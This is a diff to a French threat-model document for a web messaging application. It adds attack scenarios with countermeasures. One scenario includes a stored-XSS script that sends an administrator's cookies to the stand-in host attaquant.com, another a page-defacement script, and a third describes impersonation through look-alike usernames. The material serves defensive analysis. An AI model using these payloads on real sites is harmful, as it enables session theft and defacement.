@@ -151,9 +151,21 @@ Récupération d'un compte administrateur (XSS)
 - Motivation : amusement, financier, accès à la gestion des administrateurs
 - Elément cible : compte d'un collaborateur administrateur
 - Scénario d'attaque :
-  - 
+  - Lors de l'écriture d'un nouveau message par un collaborateur malveillant, on insère comme sujet ou message un payload qui permettra l'attaque XSS. Ce message doit être envoyé à un administrateur
+  
+  - Si aucun sanitizer n'a été mis en place pour gérer les données, alors l'attaque est possible
+  
+  - On va donc insérer dans l'un des champs un payload permettant l'attaque, par exemple :
+  
+    ```html
+    <script>
+        document.location="http://attaquant.com/get.php?v=" + document.cookie;
+    </script>
+    ```
+  
+  - On va ensuite attendre que l'administrateur se connecte à sa messagerie pour que ses identifiants soient envoyés sur le site de l'attaquant
 -  Contremesures :
-  - 
+  - Implémenter un sanitizer sur les entrées utilisateurs afin d'encoder les chaînes de caractères avant de les ajouter dans la base de données
 
 ### Scénario d'attaque 4 :
 
@@ -164,9 +176,12 @@ Usurpation d'identité
 - Motivation : amusement, accès aux informations
 - Elément cible : base de données, social engineering
 - Scénario d'attaque :
-  - 
+  - Un attaquant arrivant à récupérer des accès administrateur à l'aide de l'attaque précédente pourrait tenter cette attaque, afin de se créer un compte
+  - En connaissant le nom des autres utilisateurs, un attaquant peut créer un compte avec un nom similaire pour tenter de manipuler les autres utilisateurs, par exemple avec un caractère invisible tel que l'espace
+  - Une fois le compte créé, il pourra intéragir avec les autres utilisateurs et tenter d'obtenir des informations
+  - Les autres utlisateurs ne devraient pas remarquer qu'ils ne communiquent pas avec la bonne personne
 -  Contremesures :
-  - 
+  - Limiter les caractères utilisables pour le nom d'utilisateur
 
 ### Scénario d'attaque 5 :
 
@@ -174,12 +189,24 @@ Défacement du site (XSS)
 
 - Impact sur l'entreprise : faible
 - Source de la menace : hacker, script-kiddies, concurrent
-- Motivation : amusement, accès aux informations
+- Motivation : amusement
 - Elément cible : application Web
 - Scénario d'attaque :
-  - 
+  - Insertion de script afin de modifier le contenu de l'application Web
+  
+  - Comme pour l'autre attaque XSS, on va cette fois insérer un script afin de remplacer des éléments du site, pour déranger l'utilisateur
+  
+  - On va par exemple insérer un script de ce type :
+  
+    ```html
+    <script>
+        document.body.innerHTML="<h1>Attack on the site</h1>";
+    </script>
+    ```
+  
+  - Cela va remplacer le contenu entier de la balise <body> de la page Web afin de faire peur à l'utilisateur
 -  Contremesures :
-  - 
+  - Implémenter un sanitizer sur les entrées utilisateurs afin d'encoder les chaînes de caractères avant de les ajouter dans la base de données
 
 ### STRIDE
 
